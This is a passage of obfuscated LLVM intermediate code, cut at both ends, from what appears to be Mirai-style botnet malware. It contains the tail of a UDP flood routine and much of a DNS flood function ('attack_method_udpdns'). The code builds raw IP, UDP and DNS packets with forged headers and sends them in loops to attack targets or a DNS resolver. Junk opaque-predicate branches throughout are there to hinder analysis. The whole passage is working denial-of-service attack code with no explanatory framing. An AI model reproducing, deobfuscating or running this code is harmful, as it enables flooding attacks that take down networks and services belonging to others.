  %502 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %481, align 1
  store %struct.attack_target* %1, %struct.attack_target** %482, align 8
  store i8 %2, i8* %483, align 1
  store %struct.attack_option* %3, %struct.attack_option** %484, align 8
  %503 = load i8, i8* %481, align 1
  %504 = zext i8 %503 to i64
  %505 = call noalias i8* @calloc(i64 %504, i64 8) #6
  %506 = bitcast i8* %505 to i8**
  store i8** %506, i8*** %487, align 8
  %507 = load i8, i8* %483, align 1
  %508 = load %struct.attack_option*, %struct.attack_option** %484, align 8
  %509 = call i32 @attack_get_opt_int(i8 zeroext %507, %struct.attack_option* %508, i8 zeroext 2, i32 0)
  %510 = trunc i32 %509 to i8
  store i8 %510, i8* %488, align 1
  %511 = load i8, i8* %483, align 1
  %512 = load %struct.attack_option*, %struct.attack_option** %484, align 8
  %513 = call i32 @attack_get_opt_int(i8 zeroext %511, %struct.attack_option* %512, i8 zeroext 3, i32 65535)
  %514 = trunc i32 %513 to i16
  store i16 %514, i16* %489, align 2
  %515 = load i8, i8* %483, align 1
  %516 = load %struct.attack_option*, %struct.attack_option** %484, align 8
  %517 = call i32 @attack_get_opt_int(i8 zeroext %515, %struct.attack_option* %516, i8 zeroext 4, i32 64)
  %518 = trunc i32 %517 to i8
  store i8 %518, i8* %490, align 1
  %519 = load i8, i8* %483, align 1
  %520 = load %struct.attack_option*, %struct.attack_option** %484, align 8
  %521 = call i32 @attack_get_opt_int(i8 zeroext %519, %struct.attack_option* %520, i8 zeroext 5, i32 0)
  %522 = trunc i32 %521 to i8
  store i8 %522, i8* %491, align 1
  %523 = load i8, i8* %483, align 1
  %524 = load %struct.attack_option*, %struct.attack_option** %484, align 8
  %525 = call i32 @attack_get_opt_int(i8 zeroext %523, %struct.attack_option* %524, i8 zeroext 6, i32 65535)
  %526 = trunc i32 %525 to i16
  store i16 %526, i16* %492, align 2
  %527 = load i8, i8* %483, align 1
  %528 = load %struct.attack_option*, %struct.attack_option** %484, align 8
  %529 = call i32 @attack_get_opt_int(i8 zeroext %527, %struct.attack_option* %528, i8 zeroext 7, i32 27015)
  %530 = trunc i32 %529 to i16
  store i16 %530, i16* %493, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %531 = call i8* @table_retrieve_val(i32 20, i32* %495)
  store i8* %531, i8** %494, align 8
  %532 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %532, i32* %486, align 4
  %533 = icmp eq i32 %532, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %75
  store i32 1, i32* %17, align 4
  %534 = load i32, i32* %18, align 4
  %535 = bitcast i32* %17 to i8*
  %536 = call i32 @setsockopt(i32 %534, i32 0, i32 3, i8* %535, i32 4) #6
  %537 = icmp eq i32 %536, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %156
  %538 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %539 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %538, i32 0, i32 6
  store i8 17, i8* %539, align 1
  %540 = load i32, i32* @LOCAL_ADDR, align 4
  %541 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 8
  store i32 %540, i32* %542, align 4
  %543 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %544 = load i32, i32* %17, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %543, i64 %545
  %547 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %546, i32 0, i32 1
  %548 = load i32, i32* %547, align 4
  %549 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %550 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %549, i32 0, i32 9
  store i32 %548, i32* %550, align 4
  %551 = load i16, i16* %24, align 2
  %552 = call zeroext i16 @htons(i16 zeroext %551) #7
  %553 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %554 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %553, i32 0, i32 0
  store i16 %552, i16* %554, align 2
  %555 = load i16, i16* %25, align 2
  %556 = call zeroext i16 @htons(i16 zeroext %555) #7
  %557 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %558 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %557, i32 0, i32 1
  store i16 %556, i16* %558, align 2
  %559 = load i32, i32* %27, align 4
  %560 = sext i32 %559 to i64
  %_ = shl i64 12, %560
  %_7 = shl i64 12, %560
  %_8 = sub i64 12, %560
  %gen = mul i64 %_8, %560
  %_9 = shl i64 12, %560
  %561 = add i64 12, %560
  %562 = trunc i64 %561 to i16
  %563 = call zeroext i16 @htons(i16 zeroext %562) #7
  %564 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %565 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %564, i32 0, i32 2
  store i16 %563, i16* %565, align 2
  %566 = load i8*, i8** %30, align 8
  %567 = bitcast i8* %566 to i32*
  store i32 -1, i32* %567, align 4
  %568 = load i8*, i8** %30, align 8
  %569 = getelementptr inbounds i8, i8* %568, i64 4
  store i8* %569, i8** %30, align 8
  %570 = load i8*, i8** %30, align 8
  %571 = load i8*, i8** %26, align 8
  %572 = load i32, i32* %27, align 4
  call void @util_memcpy(i8* %570, i8* %571, i32 %572)
  br label %originalBB6

originalBB13alteredBB:                            ; preds = %originalBB13, %211
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %228
  store i32 0, i32* %17, align 4
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %245
  %573 = load i32, i32* %17, align 4
  %574 = load i8, i8* %13, align 1
  %575 = zext i8 %574 to i32
  %576 = icmp slt i32 %573, %575
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %266
  %577 = load i8**, i8*** %19, align 8
  %578 = load i32, i32* %17, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds i8*, i8** %577, i64 %579
  %581 = load i8*, i8** %580, align 8
  store i8* %581, i8** %31, align 8
  %582 = load i8*, i8** %31, align 8
  %583 = bitcast i8* %582 to %struct.iphdr*
  store %struct.iphdr* %583, %struct.iphdr** %32, align 8
  %584 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %585 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %584, i64 1
  %586 = bitcast %struct.iphdr* %585 to %struct.udphdr*
  store %struct.udphdr* %586, %struct.udphdr** %33, align 8
  %587 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %588 = load i32, i32* %17, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i64 %589
  %591 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %590, i32 0, i32 2
  %592 = load i8, i8* %591, align 4
  %593 = zext i8 %592 to i32
  %594 = icmp slt i32 %593, 32
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %326
  %595 = call i32 @rand_next()
  %596 = trunc i32 %595 to i16
  %597 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %598 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %597, i32 0, i32 3
  store i16 %596, i16* %598, align 4
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %347
  %599 = load i16, i16* %24, align 2
  %600 = zext i16 %599 to i32
  %601 = icmp eq i32 %600, 65535
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %372
  %602 = load i16, i16* %25, align 2
  %603 = zext i16 %602 to i32
  %604 = icmp eq i32 %603, 65535
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %397
  %605 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %606 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %605, i32 0, i32 7
  store i16 0, i16* %606, align 2
  %607 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %608 = bitcast %struct.iphdr* %607 to i16*
  %609 = call zeroext i16 @checksum_generic(i16* %608, i32 20)
  %610 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %611 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %610, i32 0, i32 7
  store i16 %609, i16* %611, align 2
  %612 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %613 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %612, i32 0, i32 3
  store i16 0, i16* %613, align 2
  %614 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %615 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %616 = bitcast %struct.udphdr* %615 to i8*
  %617 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %618 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %617, i32 0, i32 2
  %619 = load i16, i16* %618, align 2
  %620 = load i32, i32* %27, align 4
  %621 = sext i32 %620 to i64
  %_42 = shl i64 12, %621
  %622 = add i64 12, %621
  %623 = trunc i64 %622 to i32
  %624 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %614, i8* %616, i16 zeroext %619, i32 %623)
  %625 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %626 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %625, i32 0, i32 3
  store i16 %624, i16* %626, align 2
  %627 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %628 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %627, i32 0, i32 1
  %629 = load i16, i16* %628, align 2
  %630 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %631 = load i32, i32* %17, align 4
  %632 = sext i32 %631 to i64
  %633 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %630, i64 %632
  %634 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %633, i32 0, i32 0
  %635 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %634, i32 0, i32 1
  store i16 %629, i16* %635, align 2
  %636 = load i32, i32* %18, align 4
  %637 = load i8*, i8** %31, align 8
  %638 = load i32, i32* %27, align 4
  %639 = sext i32 %638 to i64
  %_43 = shl i64 32, %639
  %_44 = shl i64 32, %639
  %_45 = shl i64 32, %639
  %_46 = sub i64 32, %639
  %gen47 = mul i64 %_46, %639
  %_48 = sub i64 32, %639
  %gen49 = mul i64 %_48, %639
  %640 = add i64 32, %639
  %641 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %642 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %643 = load i32, i32* %17, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %642, i64 %644
  %646 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %645, i32 0, i32 0
  %647 = bitcast %struct.sockaddr_in* %646 to %struct.sockaddr*
  store %struct.sockaddr* %647, %struct.sockaddr** %641, align 8
  %648 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %649 = load %struct.sockaddr*, %struct.sockaddr** %648, align 8
  %650 = call i64 @sendto(i32 %636, i8* %637, i64 %640, i32 16384, %struct.sockaddr* %649, i32 16)
  br label %originalBB41

originalBB53alteredBB:                            ; preds = %originalBB53, %460
  %651 = load i32, i32* %17, align 4
  %652 = add nsw i32 %651, 1
  store i32 %652, i32* %17, align 4
  br label %originalBB53
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.37
  %6 = load i32, i32* @y.38
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i16, align 2
  %27 = alloca i8, align 1
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca %struct.dnshdr*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %struct.grehdr*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca %struct.iphdr*, align 8
  %42 = alloca %struct.udphdr*, align 8
  %43 = alloca %struct.dnshdr*, align 8
  %44 = alloca i8*, align 8
  %45 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %46 = load i8, i8* %13, align 1
  %47 = zext i8 %46 to i64
  %48 = call noalias i8* @calloc(i64 %47, i64 8) #6
  %49 = bitcast i8* %48 to i8**
  store i8** %49, i8*** %19, align 8
  %50 = load i8, i8* %15, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 2, i32 0)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %20, align 1
  %54 = load i8, i8* %15, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 3, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %21, align 2
  %58 = load i8, i8* %15, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 4, i32 64)
  %61 = trunc i32 %60 to i8
  store i8 %61, i8* %22, align 1
  %62 = load i8, i8* %15, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 5, i32 0)
  %65 = trunc i32 %64 to i8
  store i8 %65, i8* %23, align 1
  %66 = load i8, i8* %15, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 6, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %24, align 2
  %70 = load i8, i8* %15, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 7, i32 53)
  %73 = trunc i32 %72 to i16
  store i16 %73, i16* %25, align 2
  %74 = load i8, i8* %15, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 9, i32 65535)
  %77 = trunc i32 %76 to i16
  store i16 %77, i16* %26, align 2
  %78 = load i8, i8* %15, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 0, i32 12)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %27, align 1
  %82 = load i8, i8* %15, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %84 = call i8* @attack_get_opt_str(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 8, i8* null)
  store i8* %84, i8** %28, align 8
  %85 = call i32 @get_dns_resolver()
  store i32 %85, i32* %30, align 4
  %86 = load i8*, i8** %28, align 8
  %87 = icmp eq i8* %86, null
  %88 = load i32, i32* @x.37
  %89 = load i32, i32* @y.38
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %87, label %96, label %97

; <label>:96:                                     ; preds = %originalBBpart2
  br label %572

; <label>:97:                                     ; preds = %originalBBpart2
  %98 = load i32, i32* @x.37
  %99 = load i32, i32* @y.38
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %97
  %106 = load i8*, i8** %28, align 8
  %107 = call i32 @util_strlen(i8* %106)
  store i32 %107, i32* %29, align 4
  %108 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %108, i32* %18, align 4
  %109 = icmp eq i32 %108, -1
  %110 = load i32, i32* @x.37
  %111 = load i32, i32* @y.38
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %109, label %118, label %119

; <label>:118:                                    ; preds = %originalBBpart24
  br label %572

; <label>:119:                                    ; preds = %originalBBpart24
  store i32 1, i32* %17, align 4
  %120 = load i32, i32* %18, align 4
  %121 = bitcast i32* %17 to i8*
  %122 = call i32 @setsockopt(i32 %120, i32 0, i32 3, i8* %121, i32 4) #6
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %127

; <label>:124:                                    ; preds = %119
  %125 = load i32, i32* %18, align 4
  %126 = call i32 @close(i32 %125)
  br label %572

; <label>:127:                                    ; preds = %119
  store i32 0, i32* %17, align 4
  br label %128

; <label>:128:                                    ; preds = %401, %127
  %129 = load i32, i32* @x.37
  %130 = load i32, i32* @y.38
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %128
  %137 = load i32, i32* %17, align 4
  %138 = load i8, i8* %13, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp slt i32 %137, %139
  %141 = load i32, i32* @x.37
  %142 = load i32, i32* @y.38
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %140, label %149, label %404

; <label>:149:                                    ; preds = %originalBBpart28
  %150 = load i32, i32* @x.37
  %151 = load i32, i32* @y.38
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %149
  store i8 0, i8* %32, align 1
  store i8 0, i8* %33, align 1
  %158 = call noalias i8* @calloc(i64 600, i64 1) #6
  %159 = load i8**, i8*** %19, align 8
  %160 = load i32, i32* %17, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8*, i8** %159, i64 %161
  store i8* %158, i8** %162, align 8
  %163 = load i8**, i8*** %19, align 8
  %164 = load i32, i32* %17, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds i8*, i8** %163, i64 %165
  %167 = load i8*, i8** %166, align 8
  %168 = bitcast i8* %167 to %struct.iphdr*
  store %struct.iphdr* %168, %struct.iphdr** %34, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i64 1
  %171 = bitcast %struct.iphdr* %170 to %struct.udphdr*
  store %struct.udphdr* %171, %struct.udphdr** %35, align 8
  %172 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i64 1
  %174 = bitcast %struct.udphdr* %173 to %struct.dnshdr*
  store %struct.dnshdr* %174, %struct.dnshdr** %36, align 8
  %175 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %176 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %175, i64 1
  %177 = bitcast %struct.dnshdr* %176 to i8*
  store i8* %177, i8** %37, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = load i8, i8* %179, align 4
  %181 = and i8 %180, 15
  %182 = or i8 %181, 64
  store i8 %182, i8* %179, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %184 = bitcast %struct.iphdr* %183 to i8*
  %185 = load i8, i8* %184, align 4
  %186 = and i8 %185, -16
  %187 = or i8 %186, 5
  store i8 %187, i8* %184, align 4
  %188 = load i8, i8* %20, align 1
  %189 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 1
  store i8 %188, i8* %190, align 1
  %191 = load i8, i8* %27, align 1
  %192 = zext i8 %191 to i64
  %193 = add i64 41, %192
  %194 = add i64 %193, 2
  %195 = load i32, i32* %29, align 4
  %196 = sext i32 %195 to i64
  %197 = add i64 %194, %196
  %198 = add i64 %197, 4
  %199 = trunc i64 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 2
  store i16 %200, i16* %202, align 2
  %203 = load i16, i16* %21, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 3
  store i16 %204, i16* %206, align 4
  %207 = load i8, i8* %22, align 1
  %208 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 5
  store i8 %207, i8* %209, align 4
  %210 = load i8, i8* %23, align 1
  %211 = icmp ne i8 %210, 0
  %212 = load i32, i32* @x.37
  %213 = load i32, i32* @y.38
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBBpart276, label %originalBB10alteredBB

originalBBpart276:                                ; preds = %originalBB10
  br i1 %211, label %220, label %240

; <label>:220:                                    ; preds = %originalBBpart276
  %221 = load i32, i32* @x.37
  %222 = load i32, i32* @y.38
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %220
  %229 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %230 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 4
  store i16 %229, i16* %231, align 2
  %232 = load i32, i32* @x.37
  %233 = load i32, i32* @y.38
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %240

; <label>:240:                                    ; preds = %originalBBpart280, %originalBBpart276
  %241 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 6
  store i8 17, i8* %242, align 1
  %243 = load i32, i32* @LOCAL_ADDR, align 4
  %244 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 8
  store i32 %243, i32* %245, align 4
  %246 = load i32, i32* %30, align 4
  %247 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 9
  store i32 %246, i32* %248, align 4
  %249 = load i16, i16* %24, align 2
  %250 = call zeroext i16 @htons(i16 zeroext %249) #7
  %251 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 0
  store i16 %250, i16* %252, align 2
  %253 = load i16, i16* %25, align 2
  %254 = call zeroext i16 @htons(i16 zeroext %253) #7
  %255 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %256 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %255, i32 0, i32 1
  store i16 %254, i16* %256, align 2
  %257 = load i8, i8* %27, align 1
  %258 = zext i8 %257 to i64
  %259 = add i64 21, %258
  %260 = add i64 %259, 2
  %261 = load i32, i32* %29, align 4
  %262 = sext i32 %261 to i64
  %263 = add i64 %260, %262
  %264 = add i64 %263, 4
  %265 = trunc i64 %264 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #7
  %267 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 2
  store i16 %266, i16* %268, align 2
  %269 = load i16, i16* %26, align 2
  %270 = call zeroext i16 @htons(i16 zeroext %269) #7
  %271 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %272 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %271, i32 0, i32 0
  store i16 %270, i16* %272, align 2
  %273 = call zeroext i16 @htons(i16 zeroext 256) #7
  %274 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %275 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %274, i32 0, i32 1
  store i16 %273, i16* %275, align 2
  %276 = call zeroext i16 @htons(i16 zeroext 1) #7
  %277 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %278 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %277, i32 0, i32 2
  store i16 %276, i16* %278, align 2
  %279 = load i8, i8* %27, align 1
  %280 = load i8*, i8** %37, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 1
  store i8* %281, i8** %37, align 8
  store i8 %279, i8* %280, align 1
  %282 = load i8, i8* %27, align 1
  %283 = zext i8 %282 to i32
  %284 = load i8*, i8** %37, align 8
  %285 = sext i32 %283 to i64
  %286 = getelementptr inbounds i8, i8* %284, i64 %285
  store i8* %286, i8** %37, align 8
  %287 = load i8*, i8** %37, align 8
  store i8* %287, i8** %38, align 8
  %288 = load i8*, i8** %37, align 8
  %289 = getelementptr inbounds i8, i8* %288, i64 1
  %290 = load i8*, i8** %28, align 8
  %291 = load i32, i32* %29, align 4
  %292 = add nsw i32 %291, 1
  call void @util_memcpy(i8* %289, i8* %290, i32 %292)
  store i32 0, i32* %31, align 4
  br label %293

; <label>:293:                                    ; preds = %367, %240
  %294 = load i32, i32* %31, align 4
  %295 = load i32, i32* %29, align 4
  %296 = icmp slt i32 %294, %295
  br i1 %296, label %297, label %370

; <label>:297:                                    ; preds = %293
  %298 = load i32, i32* @x.37
  %299 = load i32, i32* @y.38
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %297
  %306 = load i8*, i8** %28, align 8
  %307 = load i32, i32* %31, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds i8, i8* %306, i64 %308
  %310 = load i8, i8* %309, align 1
  %311 = sext i8 %310 to i32
  %312 = icmp eq i32 %311, 46
  %313 = load i32, i32* @x.37
  %314 = load i32, i32* @y.38
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %312, label %321, label %331

; <label>:321:                                    ; preds = %originalBBpart284
  %322 = load i8, i8* %32, align 1
  %323 = load i8*, i8** %38, align 8
  store i8 %322, i8* %323, align 1
  store i8 0, i8* %32, align 1
  %324 = load i8, i8* %33, align 1
  %325 = add i8 %324, 1
  store i8 %325, i8* %33, align 1
  %326 = load i8*, i8** %37, align 8
  %327 = load i32, i32* %31, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds i8, i8* %326, i64 %328
  %330 = getelementptr inbounds i8, i8* %329, i64 1
